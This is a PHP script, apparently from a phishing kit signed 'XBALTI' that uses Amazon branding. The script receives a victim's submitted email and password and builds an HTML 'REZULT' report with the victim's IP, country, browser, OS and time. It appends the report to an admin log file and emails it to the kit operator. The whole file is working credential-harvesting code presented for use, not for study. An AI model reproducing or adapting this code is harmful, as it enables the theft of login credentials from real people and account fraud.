<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
$_SESSION['password']   = $_POST['password'];
$_SESSION['emaill']   = $_POST['emaill'];
$timedate = date('H:i:s d/m/Y');
include('./Email.php');
include('./get_browser.php');
include('./get_ip.php');
$msg .= "
<!DOCTYPE html>
<html>
<head>
	<title>*REZULT*</title>
</head>
<body    style=' padding:0;margin:0;
    		background-color: #fff;
    		background-attachment:fixed;
    		border-bottom:1px solid rgba(255,255,255,0);
    		color: #ff8100;
    		height: 100vh;
    		font-family: calibri;
    		background-color: #000;
    		font-size: 18px;
    		text-shadow: 0 0 10px #ff8100;'  >
	<p style='text-align: center;margin:40px 0;'  >
		<img height='100px;' src='http://icons.iconarchive.com/icons/designbolts/credit-card-payment/256/Amazon-icon.png'>
	</p>
	<div   style=' margin:0 auto;
			max-width: 900px;
			width: 100%;
			border:2px solid #ff8100;
			border-radius: 4px;
			box-shadow: 0 0 20px #ff8100; '>


		<div align='center' style=' padding:10px 20px;  '>
          <h1 style='text-align: center;' >XBALTI</h1>
			<p style='text-align: center;'>LOGIN INFORMATION FROM |".$_SESSION['country']."| ip = ".$_SESSION['_ip_']."   </p>
			<p>
				<table  style='margin:40px 0;border-bottom: 4px solid #6b5c5c;padding: 20px 0;border-radius: 4px;border-top: 4px solid #6b5c5c;'  >
					<tr>
						<td style=' width: 30%;'>
							|Email|
						</td>
						<td>: 
							".$_SESSION['emaill']."
						</td>
					</tr>
					<tr>
						<td style=' width: 30%; '>
							|Password|
						</td>
						<td>:
						".$_SESSION['password']."
						</td>
					</tr>
					<hr style='height: 10px; border: 0; box-shadow: 0 10px 10px -10px #8c8c8c inset;' />

					<tr>
						<td style=' width: 30%;'>
							|Country|
						</td>
						<td>: 
						".$_SESSION['country']."
						</td>
					</tr>
                    
                    
					<tr>
						<td style=' width: 30%;'>
							|ip|
						</td>
						<td>: 
						".$_SESSION['_ip_']."
						</td>
					</tr>
					<tr>
						<td style=' width: 30%;'>
							|Browser/System|
						</td>
						<td>: 
						".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
						</td>
                      </tr>
					<tr>
						<td style=' width: 30%;'>
							|Time / Date|
						</td>
						<td>: 
						".$timedate."
						</td>
                      </tr>
				</table>
                <hr style='height: 10px; border: 0; box-shadow: 0 10px 10px -10px #8c8c8c inset;' >
			</p>
		</div>
	</div>
</body>
</html>\n";
    $khraha = fopen("../../admin/rezulta.php", "a");
	fwrite($khraha, $msg);
    $subject .= "LOGIN INFO FROM [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."]";
    $headers .= "From: <XBALTI>";
    $headers .= "MIME-Version: 1.0\n";
	$headers .= "Content-type: text/html; charset=UTF-8\n";
    @mail($Email, $subject, $msg, $headers);
?>
